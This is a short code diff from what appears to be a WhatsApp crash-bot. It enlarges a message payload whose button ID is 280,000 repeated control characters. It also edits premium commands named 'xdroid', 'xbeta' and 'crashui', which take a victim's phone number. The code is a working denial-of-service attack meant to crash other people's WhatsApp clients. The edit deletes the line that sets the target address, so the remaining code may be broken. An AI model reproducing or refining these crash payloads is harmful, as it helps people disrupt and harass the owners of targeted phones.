@@ -604,7 +604,7 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0003".repeat(180000),
+                            buttonId: "\u0003".repeat(280000),
                             buttonText: {
                                 displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
                             },
@@ -2195,8 +2195,6 @@ break
 case 'xdroid': case 'xbeta': case 'crashui': 
 if (!isPremium) return reply(mess.only.premium);
 if (!q) return reply(`Example: ${prefix + command} 62×××`);
-
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
   
 reply(bugres);
 await sleep(1000)
